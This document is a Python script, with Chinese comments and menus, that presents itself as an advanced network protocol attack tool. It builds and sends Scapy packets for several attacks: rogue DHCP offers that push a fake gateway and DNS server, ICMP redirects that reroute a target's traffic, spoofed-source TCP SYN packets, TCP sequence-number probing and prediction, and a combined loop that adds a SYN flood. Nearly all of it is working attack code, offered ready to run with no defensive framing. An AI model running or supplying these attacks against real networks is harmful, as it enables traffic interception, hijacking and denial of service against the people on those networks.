#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
高级网络协议攻击工具
DHCP欺骗、ICMP重定向、IP欺骗等协议级攻击
"""

import socket
import struct
import threading
import time
from scapy.all import *

class AdvancedProtocolAttack:
    def __init__(self):
        self.local_ip = socket.gethostbyname(socket.gethostname())
        self.attack_running = False
    
    def run_protocol_attack_suite(self):
        """运行协议攻击套件"""
        print("=" * 80)
        print("          高级网络协议攻击工具")
        print("=" * 80)
        
        print(f"📡 本机IP: {self.local_ip}")
        print("🎯 可用的协议攻击:")
        print("1. DHCP欺骗攻击")
        print("2. ICMP重定向攻击") 
        print("3. IP欺骗攻击")
        print("4. TCP序列号预测")
        print("5. 综合协议攻击")
        
        choice = input("\n请选择攻击类型 (1-5): ").strip()
        
        if choice == "1":
            self.dhcp_spoofing_attack()
        elif choice == "2":
            self.icmp_redirect_attack()
        elif choice == "3":
            self.ip_spoofing_attack()
        elif choice == "4":
            self.tcp_sequence_prediction()
        elif choice == "5":
            self.comprehensive_protocol_attack()
        else:
            print("❌ 无效选择")
    
    def dhcp_spoofing_attack(self):
        """DHCP欺骗攻击"""
        print("\n[+] DHCP欺骗攻击")
        print("-" * 40)
        
        # 获取配置
        target_network = input("目标网络段 (如 192.168.1.0/24): ").strip()
        fake_dns = input("伪造的DNS服务器 (默认 8.8.8.8): ").strip() or "8.8.8.8"
        fake_gateway = input("伪造的网关IP: ").strip() or self.local_ip
        
        print(f"\n🎯 攻击配置:")
        print(f"   目标网络: {target_network}")
        print(f"   伪造DNS: {fake_dns}")
        print(f"   伪造网关: {fake_gateway}")
        
        if not self.confirm_attack("DHCP欺骗"):
            return
        
        self.attack_running = True
        
        def dhcp_spoofer():
            """DHCP欺骗线程"""
            print("[+] 启动DHCP欺骗...")
            
            # DHCP欺骗包
            dhcp_offer = Ether(dst="ff:ff:ff:ff:ff:ff") / \
                        IP(src=fake_gateway, dst="255.255.255.255") / \
                        UDP(sport=67, dport=68) / \
                        BOOTP(op=2, yiaddr="192.168.1.100", siaddr=fake_gateway) / \
                        DHCP(options=[("message-type", "offer"),
                                    ("server_id", fake_gateway),
                                    ("lease_time", 86400),
                                    ("subnet_mask", "255.255.255.0"),
                                    ("router", fake_gateway),
                                    ("name_server", fake_dns)])
            
            packet_count = 0
            while self.attack_running:
                try:
                    sendp(dhcp_offer, verbose=0)
                    packet_count += 1
                    
                    if packet_count % 10 == 0:
                        print(f"[DHCP] 已发送 {packet_count} 个欺骗包")
                    
                    time.sleep(2)
                    
                except Exception as e:
                    print(f"[DHCP] 错误: {e}")
        
        # 启动攻击线程
        attack_thread = threading.Thread(target=dhcp_spoofer)
        attack_thread.daemon = True
        attack_thread.start()
        
        print("\n💡 DHCP欺骗已启动")
        print("   新设备连接网络时将获得伪造的配置")
        print("   按Ctrl+C停止攻击")
        
        try:
            while self.attack_running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] 用户停止攻击")
        finally:
            self.attack_running = False
    
    def icmp_redirect_attack(self):
        """ICMP重定向攻击"""
        print("\n[+] ICMP重定向攻击")
        print("-" * 40)
        
        target_ip = input("目标IP: ").strip()
        gateway_ip = input("网关IP: ").strip()
        redirect_to = input("重定向到IP (默认本机): ").strip() or self.local_ip
        
        print(f"\n🎯 攻击配置:")
        print(f"   目标: {target_ip}")
        print(f"   网关: {gateway_ip}")
        print(f"   重定向到: {redirect_to}")
        
        if not self.confirm_attack("ICMP重定向"):
            return
        
        self.attack_running = True
        
        def icmp_attacker():
            """ICMP攻击线程"""
            print("[+] 启动ICMP重定向...")
            
            # ICMP重定向包
            icmp_redirect = IP(src=gateway_ip, dst=target_ip) / \
                          ICMP(type=5, code=1, gw=redirect_to) / \
                          IP(src=target_ip, dst="8.8.8.8") / \
                          UDP()
            
            packet_count = 0
            while self.attack_running:
                try:
                    send(icmp_redirect, verbose=0)
                    packet_count += 1
                    
                    if packet_count % 5 == 0:
                        print(f"[ICMP] 已发送 {packet_count} 个重定向包")
                    
                    time.sleep(3)
                    
                except Exception as e:
                    print(f"[ICMP] 错误: {e}")
        
        attack_thread = threading.Thread(target=icmp_attacker)
        attack_thread.daemon = True
        attack_thread.start()
        
        print("\n💡 ICMP重定向已启动")
        print("   目标设备的流量将被重定向")
        print("   按Ctrl+C停止攻击")
        
        try:
            while self.attack_running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] 用户停止攻击")
        finally:
            self.attack_running = False
    
    def ip_spoofing_attack(self):
        """IP欺骗攻击"""
        print("\n[+] IP欺骗攻击")
        print("-" * 40)
        
        spoofed_ip = input("伪造的源IP: ").strip()
        target_ip = input("目标IP: ").strip()
        target_port = int(input("目标端口 (默认80): ").strip() or "80")
        
        print(f"\n🎯 攻击配置:")
        print(f"   伪造IP: {spoofed_ip}")
        print(f"   目标: {target_ip}:{target_port}")
        
        if not self.confirm_attack("IP欺骗"):
            return
        
        self.attack_running = True
        
        def ip_spoofer():
            """IP欺骗线程"""
            print("[+] 启动IP欺骗...")
            
            # 创建欺骗包
            spoofed_packet = IP(src=spoofed_ip, dst=target_ip) / \
                            TCP(dport=target_port, flags="S")
            
            packet_count = 0
            while self.attack_running:
                try:
                    send(spoofed_packet, verbose=0)
                    packet_count += 1
                    
                    if packet_count % 20 == 0:
                        print(f"[IP欺骗] 已发送 {packet_count} 个欺骗包")
                    
                    time.sleep(0.1)
                    
                except Exception as e:
                    print(f"[IP欺骗] 错误: {e}")
        
        attack_thread = threading.Thread(target=ip_spoofer)
        attack_thread.daemon = True
        attack_thread.start()
        
        print("\n💡 IP欺骗已启动")
        print("   发送伪造源IP的数据包")
        print("   按Ctrl+C停止攻击")
        
        try:
            while self.attack_running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] 用户停止攻击")
        finally:
            self.attack_running = False
    
    def tcp_sequence_prediction(self):
        """TCP序列号预测"""
        print("\n[+] TCP序列号预测攻击")
        print("-" * 40)
        
        target_ip = input("目标IP: ").strip()
        target_port = int(input("目标端口: ").strip())
        
        print(f"\n🎯 攻击目标: {target_ip}:{target_port}")
        
        if not self.confirm_attack("TCP序列号预测"):
            return
        
        print("[+] 开始TCP序列号分析...")
        
        # 发送SYN包分析序列号模式
        sequences = []
        
        for i in range(10):
            try:
                syn_packet = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
                response = sr1(syn_packet, timeout=2, verbose=0)
                
                if response and response.haslayer(TCP):
                    seq = response[TCP].seq
                    sequences.append(seq)
                    print(f"   序列号 {i+1}: {seq}")
                
                time.sleep(1)
                
            except Exception as e:
                print(f"   测试 {i+1} 失败: {e}")
        
        if sequences:
            # 分析序列号模式
            differences = [sequences[i+1] - sequences[i] for i in range(len(sequences)-1)]
            
            print(f"\n📊 序列号分析:")
            print(f"   序列号数量: {len(sequences)}")
            print(f"   平均增量: {sum(differences)/len(differences) if differences else 0}")
            
            # 预测下一个序列号
            if len(sequences) >= 2:
                predicted = sequences[-1] + (sequences[-1] - sequences[-2])
                print(f"   预测下一个序列号: {predicted}")
        
        print("\n💡 TCP序列号预测完成")
    
    def comprehensive_protocol_attack(self):
        """综合协议攻击"""
        print("\n[+] 综合网络协议攻击")
        print("-" * 40)
        
        target_ip = input("目标IP: ").strip()
        gateway_ip = input("网关IP: ").strip()
        
        print(f"\n🎯 攻击目标: {target_ip}")
        print(f"   网关: {gateway_ip}")
        
        if not self.confirm_attack("综合协议攻击"):
            return
        
        self.attack_running = True
        
        def multi_attack():
            """多协议攻击线程"""
            print("[+] 启动综合协议攻击...")
            
            attack_count = 0
            while self.attack_running:
                try:
                    # 1. ICMP重定向
                    icmp_packet = IP(src=gateway_ip, dst=target_ip) / \
                                 ICMP(type=5, code=1, gw=self.local_ip) / \
                                 IP(src=target_ip, dst="8.8.8.8") / UDP()
                    send(icmp_packet, verbose=0)
                    
                    # 2. TCP SYN洪水
                    syn_packet = IP(dst=target_ip) / TCP(dport=80, flags="S")
                    send(syn_packet, verbose=0)
                    
                    # 3. IP欺骗
                    spoofed_packet = IP(src="192.168.1.100", dst=target_ip) / TCP(dport=443)
                    send(spoofed_packet, verbose=0)
                    
                    attack_count += 1
                    
                    if attack_count % 10 == 0:
                        print(f"[综合] 已执行 {attack_count} 轮攻击")
                    
                    time.sleep(1)
                    
                except Exception as e:
                    print(f"[综合] 错误: {e}")
        
        attack_thread = threading.Thread(target=multi_attack)
        attack_thread.daemon = True
        attack_thread.start()
        
        print("\n💡 综合协议攻击已启动")
        print("   包含ICMP重定向、TCP洪水、IP欺骗")
        print("   按Ctrl+C停止攻击")
        
        try:
            while self.attack_running:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] 用户停止攻击")
        finally:
            self.attack_running = False
    
    def confirm_attack(self, attack_name):
        """确认攻击"""
        print(f"\n⚠️  即将执行 {attack_name} 攻击")
        print("   此操作可能影响网络正常通信")
        
        confirm = input("确认执行? (Y/N): ").strip().upper()
        return confirm == "Y"

def main():
    """主函数"""
    try:
        attack = AdvancedProtocolAttack()
        attack.run_protocol_attack_suite()
        
    except KeyboardInterrupt:
        print("\n👋 程序被用户中断")
    except Exception as e:
        print(f"❌ 程序错误: {e}")

if __name__ == "__main__":
    main()